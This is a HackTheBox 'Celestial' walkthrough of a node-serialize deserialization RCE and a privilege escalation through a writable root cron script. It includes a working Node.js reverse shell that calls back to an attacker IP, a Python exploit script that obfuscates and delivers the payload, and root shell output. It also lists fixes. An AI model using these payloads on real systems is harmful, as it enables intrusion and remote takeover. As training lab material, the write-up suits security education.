Overview &amp; Mindset</h2><p>Celestial teaches two fundamental concepts that appear constantly in real-world penetration testing:</p><p>- Deserialization vulnerabilities — trusting user-supplied serialized data and executing it<br />- Cron job abuse — a privileged scheduled task running a file that a low-privileged user can overwrite</p><p>The hacker mindset throughout this box is: trust nothing the server gives you, and question everything your browser stores. Cookies, headers, and parameters are all attacker-controlled inputs. The moment you see encoded data being sent to the server and reflected back, you ask: what happens if I tamper with this?</p><h2 id="2-reconnaissance">2. The server is storing state client-side in a cookie, then reading it back on every request.</p><p>Hacker mindset: Any time a server stores data on the client and reads it back, you control that data. The question is: what does the server do with it? If it just displays it, we look for XSS. If it executes it or passes it to dangerous functions, we look for RCE.</p><p>Second visit, what changes?</p><p>Send the request again with the cookie:</p><p>curl -i <a href="http://10.129.228.94:3000/" rel="nofollow noopener noreferrer" target="_blank">http://10.129.228.94:3000/</a> -H “Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==”</p><p>Response body:</p><p>Hey Dummy 2 + 2 is 22</p><figure><img src="/writing/media/2521b5c376cb2b424fab4815.webp" alt="HackTheBox “Celestial” Walkthrough, figure 4" width="1200" height="229" loading="lazy" decoding="async" /></figure><p>Critical observation</p><p>The server is:<br />1. Reading the profile cookie<br />2. Deserializing it (converting the JSON string back into an object)<br />3. Using obj.username and obj.num to build a response<br />4. Performing math: 2 + 2 = 22? That’s string concatenation, not addition — the num field is a string, and it’s being concatenated with itself</p><p>The fact that num is being “added” to itself suggests the code does something like eval(obj.num + obj.num). This is a massive red flag — user-controlled data going into eval().</p><p>Hacker mindset: The app trusts the cookie completely. It reads our data, deserializes it, and uses the values. Time to look at what deserialization library Node.js apps typically use — and whether it’s exploitable.</p><h2 id="4-understanding-the-vulnerability">4. Understanding the Vulnerability</h2><p>What is deserialization?</p><p>Serialization = converting a data structure (like a JavaScript object) into a storable string format (like JSON).</p><p>Deserialization = the reverse: converting that string back into a live object in memory.</p><p>The danger is when a deserialization library is designed to also reconstruct functions, not just data. If an attacker can inject a function into the serialized data, and the server executes it during deserialization — that’s Remote Code Execution (RCE).</p><p>The node-serialize library</p><p>The server.js source code (found later on the box) reveals:</p><p>var serialize = require(‘node-serialize’);<br />var obj = serialize.unserialize(str);</p><p>The node-serialize library supports serializing JavaScript functions using a special marker: _$$ND_FUNC$$_. When it deserializes a string containing this marker, it reconstructs the function.</p><p>The critical flaw: if the function is immediately invoked (an IIFE — Immediately Invoked Function Expression), it executes at deserialization time. The syntax for an IIFE is wrapping the function body in ():</p><p>// Normal function (stored but not called):<br />{“rce”:”_$$ND_FUNC$$_function(){ … }”}</p><p>// IIFE (executes immediately on deserialization):<br />{“rce”:”_$$ND_FUNC$$_function(){ … }()”}</p><p>Notice the () at the end before the closing “. That’s the trigger.</p><p>Why this is dangerous</p><p>The server calls serialize.unserialize(cookie) on every request. If we craft a cookie that contains a function with () at the end, the function executes on the server with the server’s privileges (in this case, running as user sun).</p><p>Hacker mindset: The library was designed to serialize functions for legitimate use. The developer using it for user-facing cookie data didn’t realize they were handing attackers a code execution primitive. This is a classic case of using a powerful library unsafely.</p><h2 id="5-crafting-the-exploit">5. Crafting the Exploit</h2><p>The plan</p><p>We need to:<br />1. Write a Node.js reverse shell (code that connects back to our machine)<br />2. Encode it to avoid bad characters<br />3. Wrap it in the node-serialize IIFE payload format<br />4. Base64-encode the whole thing (cookie format)<br />5. Send it as the profile cookie</p><p>The reverse shell logic</p><p>A reverse shell makes the target connect to us, rather than us connecting to the target. This bypasses firewalls that block inbound connections but allow outbound ones.</p><p>The Node.js reverse shell:</p><p>var net = require(‘net’);<br />var spawn = require(‘child_process’).spawn;<br />HOST=”10.10.16.84"; // our Kali IP<br />PORT=”4444"; // our listening port<br />// connect to attacker, pipe /bin/sh through the socket<br />var client = new net.Socket();<br />client.connect(PORT, HOST, function() {<br /> var sh = spawn(‘/bin/sh’,[]);<br /> client.pipe(sh.stdin);<br /> sh.stdout.pipe(client);<br /> sh.stderr.pipe(client);<br />});</p><p>Why encode with String.fromCharCode?</p><p>The cookie value goes through URL encoding and HTTP parsing. Special characters like quotes, slashes, and newlines can break the payload. By encoding every character as its decimal ASCII value and using String.fromCharCode() to reconstruct the string at runtime, we avoid any character issues.</p><p>eval(String.fromCharCode(10,118,97,114,…))</p><p>This is a common obfuscation technique — the actual JS code is hidden as numbers, reconstructed and executed at runtime.</p><p>The full exploit script</p><p>celestial_exploit.py</p><p>import base64<br />import requests</p><p>LHOST = “10.10.16.84”<br />LPORT = “4444”</p><p>js_payload = f”””<br />var net = require(‘net’);<br />var spawn = require(‘child_process’).spawn;<br />HOST=”{LHOST}”;<br />PORT=”{LPORT}”;<br />…<br />“””</p><p># Encode each character as its ASCII decimal value<br />char_codes = “,”.join(str(ord(c)) for c in js_payload)<br />encoded_js = f”eval(String.fromCharCode({char_codes}))”</p><p># Wrap in IIFE format — the () at the end triggers execution<br />serialized = ‘{{“rce”:”_$$ND_FUNC$$_function(){{{encoded_js}}}()”}}’.format(…)</p><p># Base64 encode for the cookie<br />cookie_value = base64.b64encode(serialized.encode()).decode()</p><p># Send the request — server deserializes cookie → executes function → reverse shell<br />requests.get(“<a href="http://10.129.228.94:3000/" rel="nofollow noopener noreferrer" target="_blank">http://10.129.228.94:3000/</a>", headers={“Cookie”: f”profile={cookie_value}”})</p><p>What happens server-side</p><p>1. Server receives our request with the malicious profile cookie<br />2. It base64-decodes the cookie<br />3. It calls serialize.unserialize(decoded_cookie)<br />4. The library sees _$$ND_FUNC$$_function(){…}() — an IIFE<br />5. It reconstructs and immediately executes the function<br />6. The function opens a TCP connection back to our Kali machine on port 4444<br />7. It pipes /bin/sh through that connection — giving us an interactive shell</p><h2 id="6-initial-foothold-shell-as-sun">6. When the target connects, it hands us the /bin/sh process directly. Think of it as answering the phone — we pick up, and the target’s shell is on the other end.</p><p>Flags:<br />- -l — listen mode<br />- -n — no DNS resolution (faster)<br />- -v — verbose (shows connection info)<br />- -p 4444 — listen on port 4444</p><figure><img src="/writing/media/2d48ab0c94cd1a629da88a90.webp" alt="HackTheBox “Celestial” Walkthrough, figure 5" width="494" height="186" loading="lazy" decoding="async" /></figure><h3 id="step-2-send-the-exploit">Step 2: Send the exploit</h3><p>python3 celestial_exploit.py</p><figure><img src="/writing/media/63dabf446b053be6f5a1af13.webp" alt="HackTheBox “Celestial” Walkthrough, figure 6" width="1200" height="655" loading="lazy" decoding="async" /></figure><h3 id="step-3-upgrade-the-shell-optional-but-recommended">Step 3: Upgrade the shell (optional but recommended)</h3><p>The raw shell has no job control or tab completion. User Flag</h2><p>cat ~/Documents/user.txt</p><figure><img src="/writing/media/21b8e4e5c770b2d5e0146abd.webp" alt="HackTheBox “Celestial” Walkthrough, figure 7" width="1200" height="383" loading="lazy" decoding="async" /></figure><p>The user flag lives in /home/sun/Documents/user.txt.</p><p>Why is it there and not in the home directory?<br />HTB boxes vary the flag location to prevent automated solvers. Root Flag</h2><p>When the cron fires, your listener catches the connection:</p><p>connect to [10.10.16.84] from (UNKNOWN) [10.129.228.94] 41858<br />/bin/sh: 0: can’t access tty; job control turned off<br />#id<br />uid=0(root) gid=0(root) groups=0(root)</p><p>#cat /root/root.txt</p><figure><img src="/writing/media/27f44a3a8e28c55cc621a7b5.webp" alt="HackTheBox “Celestial” Walkthrough, figure 14" width="886" height="316" loading="lazy" decoding="async" /></figure><p>Machine complete.</p><h2 id="10-key-takeaways">10. Key Takeaways</h2><p>Vulnerability 1: Node.js Deserialization (CVE-2017–5941)</p><p>Root cause: The node-serialize library can serialize/deserialize JavaScript functions. When user-controlled data is passed directly to unserialize(), an attacker can inject an IIFE that executes on the server.</p><p>Fix: Never deserialize user-controlled data. If you must store state client-side, use signed/encrypted JWTs instead of raw serialized objects. Never use node-serialize on untrusted input.</p><p>Real-world relevance: Deserialization bugs exist in Java (Apache Commons Collections), Python (pickle), PHP (unserialize), Ruby (Marshal), and more. The class of vulnerability is language-agnostic — it’s about trusting the format of user input too much.</p><p>Vulnerability 2: Cron Job with Writable Script</p><p>Root cause: A root-owned cron job executes a script file that is writable by a low-privileged user. The privilege boundary between the process (root) and the file it executes (user-writable) is broken.</p><p>Fix: Scripts executed by privileged cron jobs must be owned by root and not writable by other users. Use chmod 700 script.py &amp;&amp; chown root:root script.py.</p><p>Real-world relevance: This pattern appears constantly in misconfigured Linux servers — backup scripts, monitoring scripts, cleanup scripts all running as root but placed in user-writable directories.</p><h2 id="the-hacker-thought-process-summary">The Hacker Thought Process (Summary)</h2><p>- Nmap: Port 3000, Node.js Express<br /> Question: What does the web app do?<br /> Action: Browse/curl it</p><p>- Cookie: Base64 JSON in cookie<br /> Question: What does the server do with this?<br /> Action: Decode it, tamper with it</p><p>- Deserialization: node-serialize + user data<br /> Question: Can I inject executable code?<br /> Action: Craft IIFE payload</p><p>- Shell as sun: Home dir has script.py, output.txt owned by root<br /> Question: Is a cron job running this?<br /> Action: Check timestamps, wait</p><p>- Cron confirmed: script.py runs as root, but sun owns it<br /> Question: Can I overwrite it?<br /> Action: Replace with reverse shell</p><p>- Root shell: uid=0<br /> Action: Get the flag with cat /root/root.txt</p><h2 id="tools-used">Tools Used</h2><p>- nmap — Port scanning and service detection<br />- curl — HTTP requests and header inspection<br />- base64 — Encode/decode cookie values<br />- python3 — Exploit scripting<br />- nc (netcat) — Reverse shell listener<br />- echo — Write malicious script to disk</p><p>Celestial — Rooted.
